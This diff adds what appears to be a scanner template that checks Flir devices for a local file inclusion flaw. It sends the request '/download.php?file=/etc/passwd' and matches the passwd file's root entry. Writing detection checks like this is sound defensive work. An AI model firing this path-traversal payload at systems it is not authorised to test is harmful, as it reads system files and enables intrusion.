@@ -1,0 +1,21 @@
+id: flir-path-traversal
+name: Flir - Local File Inclusion
+severity: high
+confidence: tentative
+description: Flir is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- flir
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /download.php?file=/etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
